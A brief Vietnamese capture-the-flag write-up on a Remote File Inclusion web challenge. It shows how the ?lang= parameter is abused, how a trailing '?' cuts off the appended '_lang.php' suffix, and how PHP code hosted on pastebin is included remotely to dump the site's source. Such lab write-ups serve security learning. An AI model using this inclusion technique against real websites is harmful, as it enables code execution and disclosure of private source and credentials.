Tiêu đề của chall này chính là 1 hint, bài này phải khai thác theo hướng Remote File Inclusion, điểm khai thác chính là đường dẫn `?lang=...`

Thử với 1 file không có sẵn : `?lang=eng`, trang web hiện lên thông báo như sau:

> Warning: include(eng_lang.php): failed to open stream: No such file or  directory in /challenge/web-serveur/ch13/index.php on line 18 Warning: include(): Failed opening 'eng_lang.php' for inclusion  (include_path='.:/usr/share/php') in  /challenge/web-serveur/ch13/index.php on line 18

Vậy nó sẽ tự động thêm đuôi `_lang.php` vào đằng sau file. Phải làm thế nào để cắt phần đó đi, có thể dùng `null bytes` hoặc dấu hỏi chấm(đằng sau dấu `?` coi là parameter đính kèm ). Thử với link của  google : `?lang=https://www.google.com/?` , trang web đã có giao diện của trang google

Dùng [pastebin](https://pastebin.com/), viết ` đoạn code php để đọc password:

```php
<?php show_source('index.php'); ?>
```

đính kèm tên file raw của pastebin vào url `?lang=pastebin.blabla` ta sẽ có được source code của trang web

